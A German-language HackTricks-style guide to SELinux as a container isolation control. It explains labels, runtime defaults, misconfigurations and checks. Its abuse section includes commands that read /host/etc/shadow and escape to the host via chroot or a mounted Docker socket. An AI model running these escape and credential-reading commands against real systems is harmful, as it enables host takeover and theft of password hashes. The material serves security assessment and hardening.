# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Überblick

SELinux ist ein etikettenbasiertes Mandatory Access Control (MAC)-System. Jeder relevante Prozess und jedes Objekt kann einen Sicherheitskontext tragen, und die Richtlinie entscheidet, welche Domänen mit welchen Typen und auf welche Weise interagieren dürfen. In containerisierten Umgebungen bedeutet das in der Regel, dass die Runtime den Containerprozess unter einer eingeschränkten Container-Domäne startet und den Containerinhalt mit entsprechenden Typen versieht. Wenn die Richtlinie korrekt arbeitet, kann der Prozess die Dinge lesen und schreiben, die sein Label erwartungsgemäß berühren darf, während ihm der Zugriff auf andere Host-Inhalte verweigert wird, selbst wenn dieser Inhalt über ein mount sichtbar wird.

Dies ist einer der mächtigsten Host-seitigen Schutzmechanismen, die in gängigen Linux-Container-Deployments verfügbar sind. Es ist besonders wichtig auf Fedora, RHEL, CentOS Stream, OpenShift und in anderen SELinux-zentrierten Ökosystemen. In diesen Umgebungen wird ein Prüfer, der SELinux ignoriert, oft nicht verstehen, warum ein offensichtlich wirkender Pfad zur Host-Kompromittierung tatsächlich blockiert ist.

## AppArmor vs. SELinux

Der einfachste Unterschied auf hoher Ebene ist, dass AppArmor pfadbasiert ist, während SELinux etikettenbasiert ist. Das hat große Konsequenzen für die Container-Sicherheit. Eine pfadbasierte Richtlinie kann sich anders verhalten, wenn derselbe Host-Inhalt unter einem unerwarteten mount path sichtbar wird. Eine etikettenbasierte Richtlinie fragt stattdessen, welches Label das Objekt hat und was die Prozess-Domäne damit tun darf. Das macht SELinux nicht einfach, aber es macht es robust gegenüber einer Klasse von Pfad-Trick-Annahmen, die Verteidiger in AppArmor-basierten Systemen manchmal versehentlich treffen.

Weil das Modell etikettenorientiert ist, sind die Handhabung von Container-Volumes und Entscheidungen zum Relabeling sicherheitskritisch. Wenn die Runtime oder der Operator Labels zu weitreichend ändert, um "mounts zum Laufen zu bringen", kann die Richtliniengrenze, die die Workload eindämmen sollte, viel schwächer werden als beabsichtigt.

## Labor

Um zu prüfen, ob SELinux auf dem Host aktiv ist:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Um vorhandene Labels auf dem Host zu überprüfen:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Um einen normalen Lauf mit einem zu vergleichen, bei dem die Kennzeichnung deaktiviert ist:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Auf einem SELinux-aktivierten Host ist dies eine sehr praxisnahe Demonstration, weil sie den Unterschied zwischen einer Workload, die unter der erwarteten Container-Domain läuft, und einer, der diese Durchsetzungsebene entzogen wurde, zeigt.

## Laufzeit

Podman ist besonders gut auf SELinux abgestimmt auf Systemen, wo SELinux Teil der Plattform-Standardeinstellungen ist. Rootless Podman plus SELinux ist eine der stärksten verbreiteten Container-Baselines, weil der Prozess auf Host-Seite bereits unprivilegiert ist und weiterhin durch MAC-Policy eingeschränkt wird. Docker kann SELinux ebenfalls nutzen, wo es unterstützt wird, obwohl Administratoren es manchmal deaktivieren, um Probleme mit Volume-Labeling zu umgehen. CRI-O und OpenShift verlassen sich stark auf SELinux als Teil ihrer Container-Isolationslösung. Kubernetes kann SELinux-bezogene Einstellungen ebenfalls verfügbar machen, aber ihr Wert hängt natürlich davon ab, ob das Node-OS SELinux tatsächlich unterstützt und durchsetzt.

Die wiederkehrende Lehre ist, dass SELinux kein optionales Beiwerk ist. In den Ökosystemen, die darum aufgebaut sind, ist es Teil der erwarteten Sicherheitsgrenze.

## Fehlkonfigurationen

Der klassische Fehler ist `label=disable`. Operativ passiert das oft, weil ein Volume-Mount verweigert wurde und die schnellste kurzfristige Lösung darin bestand, SELinux aus der Gleichung zu entfernen, statt das Labeling-Modell zu reparieren. Ein weiterer häufiger Fehler ist falsches Relabeln von Host-Inhalten. Breite Relabel-Operationen können die Anwendung zwar zum Laufen bringen, sie können aber auch den Bereich dessen erweitern, was der Container anrühren darf, weit über das ursprünglich Beabsichtigte hinaus.

Wichtig ist auch, **installiertes** SELinux nicht mit **effektivem** SELinux zu verwechseln. Ein Host kann SELinux unterstützen und trotzdem im permissive-Modus sein, oder die Laufzeitumgebung bringt die Workload möglicherweise nicht unter der erwarteten Domain zum Start. In solchen Fällen ist der Schutz deutlich schwächer, als die Dokumentation suggerieren könnte.

## Missbrauch

Wenn SELinux fehlt, im permissive-Modus ist oder für die Workload weitgehend deaktiviert wurde, werden host-gemountete Pfade viel leichter missbrauchbar. Derselbe bind mount, der ansonsten durch Labels eingeschränkt wäre, kann zu einem direkten Zugang zu Host-Daten oder Host-Modifikationen werden. Das ist besonders relevant in Kombination mit beschreibbaren Volume-Mounts, container runtime-Verzeichnissen oder operativen Abkürzungen, die sensible Host-Pfade der Bequemlichkeit halber freilegten.

SELinux erklärt oft, warum ein generischer breakout writeup auf einem Host sofort funktioniert, auf einem anderen jedoch immer wieder fehlschlägt, obwohl die runtime flags ähnlich aussehen. Die fehlende Zutat ist häufig überhaupt kein Namespace oder eine Capability, sondern eine Label-Grenze, die intakt geblieben ist.

Die schnellste praktische Prüfung ist, den aktiven Kontext zu vergleichen und dann gemountete Host-Pfade oder runtime-Verzeichnisse zu prüfen, die normalerweise durch Labels eingeschränkt wären:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Wenn ein host bind mount vorhanden ist und SELinux labeling deaktiviert oder abgeschwächt wurde, kommt es häufig zuerst zu einer Informationsoffenlegung:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Wenn der mount writable ist und der container aus Sicht des kernel effektiv host-root ist, besteht der nächste Schritt darin, kontrollierte Änderungen am Host zu testen, anstatt zu raten:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Auf SELinux-capable Hosts kann der Verlust von Labels an Laufzeit-Statusverzeichnissen auch direkte privilege-escalation-Pfade offenlegen:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Diese Befehle ersetzen keine vollständige escape chain, aber sie machen sehr schnell deutlich, ob SELinux das war, was den Zugriff auf Host-Daten oder Modifikationen von Dateien auf der Host-Seite verhindert hat.

### Vollständiges Beispiel: SELinux deaktiviert + schreibbarer Host-Mount

Wenn SELinux-Labeling deaktiviert ist und das Host-Dateisystem unter `/host` schreibbar gemountet ist, wird ein vollständiger host escape zu einem normalen bind-mount abuse case:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Wenn das `chroot` erfolgreich ist, läuft der container-Prozess jetzt im Host-Dateisystem:
```bash
id
hostname
cat /etc/passwd | tail
```
### Vollständiges Beispiel: SELinux deaktiviert + Runtime-Verzeichnis

Wenn die workload nach dem Deaktivieren der labels einen runtime socket erreichen kann, kann der escape an die runtime delegiert werden:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Die relevante Beobachtung ist, dass SELinux häufig die Kontrolle darstellt, die genau diese Art von host-path- oder runtime-state-Zugriff verhindert.

## Überprüfungen

Das Ziel der SELinux-Checks ist es, zu bestätigen, dass SELinux aktiviert ist, den aktuellen Sicherheitskontext zu identifizieren und zu prüfen, ob die für Sie relevanten Dateien oder Pfade tatsächlich durch Labels eingeschränkt sind.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Was hier wichtig ist:

- `getenforce` sollte idealerweise `Enforcing` zurückgeben; `Permissive` oder `Disabled` ändern die Bedeutung des gesamten SELinux-Abschnitts.
- Wenn der aktuelle Prozesskontext unerwartet oder zu breit wirkt, läuft die Workload möglicherweise nicht unter der vorgesehenen Container-Policy.
- Wenn auf dem Host eingehängte Dateien oder Laufzeitverzeichnisse Labels haben, auf die der Prozess zu frei zugreifen kann, werden Bind-Mounts deutlich gefährlicher.

Wenn Sie einen Container auf einer SELinux-fähigen Plattform prüfen, sollten Sie die Kennzeichnung nicht als nebensächliche Kleinigkeit abtun. In vielen Fällen ist sie einer der Hauptgründe, warum der Host noch nicht kompromittiert ist.

## Standardwerte zur Laufzeit

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Vom Host abhängig | SELinux-Isolation ist auf SELinux-aktivierten Hosts verfügbar, aber das genaue Verhalten hängt von der Host-/Daemon-Konfiguration ab | `--security-opt label=disable`, breites Umlabeln von Bind-Mounts, `--privileged` |
| Podman | Auf SELinux-Hosts üblicherweise aktiviert | SELinux-Isolation ist bei Podman auf SELinux-Systemen üblich, sofern nicht deaktiviert | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Wird nicht generell automatisch auf Pod-Ebene vergeben | SELinux-Unterstützung existiert, aber Pods benötigen in der Regel `securityContext.seLinuxOptions` oder plattformspezifische Defaults; Laufzeit- und Node-Unterstützung sind erforderlich | schwache oder zu breite `seLinuxOptions`, Betrieb auf permissiven/deaktivierten Nodes, Plattform-Policies, die die Kennzeichnung deaktivieren |
| CRI-O / OpenShift style deployments | Wird häufig intensiv genutzt | SELinux ist in diesen Umgebungen oft ein Kernbestandteil des Node-Isolationsmodells | benutzerdefinierte Policies, die Zugriffe übermäßig ausweiten, Deaktivierung der Kennzeichnung zur Kompatibilität |

SELinux-Standards sind distributionsabhängiger als seccomp-Standards. Auf Fedora/RHEL/OpenShift-ähnlichen Systemen ist SELinux oft zentral für das Isolationsmodell. Auf Systemen ohne SELinux ist es schlicht nicht vorhanden.
{{#include ../../../../banners/hacktricks-training.md}}
